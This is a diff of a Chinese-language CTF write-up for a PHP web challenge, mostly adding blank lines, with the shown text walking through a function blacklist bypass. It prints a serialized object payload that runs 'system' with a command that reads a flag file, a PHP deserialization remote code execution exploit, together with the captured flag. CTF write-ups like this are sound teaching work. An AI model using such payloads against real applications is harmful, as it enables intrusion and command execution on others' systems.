@@ -2,7 +2,9 @@
 
 ---
 每隔五秒`POST`一次，传递`func`和`p`参数
+
 ![[Pasted image 20221113204657.png]]
+
 ![[Pasted image 20221113204833.png]]
 ```php
 func=abc&p=123
@@ -87,7 +89,9 @@ func=file_get_contents&p=index.php
 </html>
 ```
 好家伙，ban了这么多
+
 注意到有个从没用到的`Test`类，里边还有个`__destruct`方法，而且`unserialize`也没被ban，看来反序列化八九不离十了
+
 大致思路是构造payload，利用反序列化生成`Test`类的一个对象，再借由其`__destruct`方法绕过过滤
 
 ```php
@@ -123,7 +127,9 @@ $payload->p = 'cat /tmp/flagoefiu4r93';
 ```php
 func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
 ```
+
 ```
 flag{3b352024-0ec2-4ac3-a110-9cbd86917b0c}
 ```
+
 #Web #PHP #反序列化 #RCE
